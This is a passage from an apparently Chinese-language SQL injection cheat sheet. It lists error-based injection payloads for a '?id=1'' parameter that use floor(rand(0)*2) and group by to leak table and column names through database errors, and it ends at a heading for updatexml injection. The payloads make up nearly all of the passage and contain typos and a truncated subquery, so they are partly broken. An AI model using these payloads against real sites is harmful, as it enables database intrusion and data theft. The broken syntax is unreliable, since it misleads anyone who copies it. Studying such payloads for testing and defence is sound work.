...
- 查表名`?id=1' and (select 1 from (select count(*),concat((select table name from information schema.table where table schema=database() limit 0,1),floor(rand(0)*2))x from information schema.tables rroup by x)a)--+`
- 查字段名`?id=1' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name='user' limit 0,1),floor(rand(0)*2))x from))--+`
### 2.updatexml报错注入
